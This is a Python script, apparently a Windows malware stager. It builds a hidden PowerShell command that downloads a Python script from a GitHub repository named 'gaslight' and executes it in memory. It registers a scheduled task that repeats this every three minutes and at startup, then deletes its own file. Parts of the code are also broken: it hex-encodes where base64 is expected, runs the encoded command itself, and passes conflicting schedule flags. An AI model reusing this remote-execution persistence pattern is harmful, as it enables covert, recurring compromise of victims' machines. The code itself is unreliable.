import os
import subprocess
import sys
import time

# Scheduled Task Name
task_name = "somethingunique"

# Direct GitHub raw link to the Python script
python_script_url = "https://raw.githubusercontent.com/davidkennedy02/gaslight/main/surprise.py"

# Step 1: Define the PowerShell command to download & run Python script in memory
powershell_command = f'''
$URL = "{python_script_url}";
$Response = Invoke-WebRequest -Uri $URL -UseBasicParsing;
$PythonScript = $Response.Content;
$PythonPath = (Get-Command pythonw.exe).Source;
Invoke-Expression "& $PythonPath -c `"$PythonScript`"";
'''

# Step 2: Create a one-liner PowerShell command to be executed by the scheduled task
encoded_powershell_command = subprocess.run(
    ["powershell", "-NoProfile", "-EncodedCommand", powershell_command.encode("utf-16le").hex()],
    capture_output=True,
    text=True
).stdout.strip()

# Step 3: Create the scheduled task that executes PowerShell entirely in memory
create_task_command = f"""
schtasks /create /tn "{task_name}" /tr "powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand {encoded_powershell_command}" /sc minute /mo 3 /f /rl lowest /IT /SC ONSTART
"""

# Execute the scheduled task creation command
os.system(create_task_command)

# Step 4: Self-delete setup script (optional)
current_script_path = os.path.realpath(__file__)
time.sleep(2)
subprocess.Popen(f'cmd.exe /c del "{current_script_path}"', shell=True)
sys.exit()
